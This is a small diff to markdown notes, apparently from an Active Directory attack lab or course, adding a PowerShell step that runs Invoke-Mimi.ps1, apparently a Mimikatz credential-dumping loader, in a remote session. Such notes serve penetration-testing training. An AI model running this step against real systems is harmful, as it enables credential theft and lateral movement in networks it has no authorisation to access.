@@ -464,6 +464,9 @@ exit
 ```
 Load and launch Invoke-Mimi
 ```powershell
+Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $sess
+```
+```powershell
 Enter-PSSession -Session $sess
 ```
 ```powershell
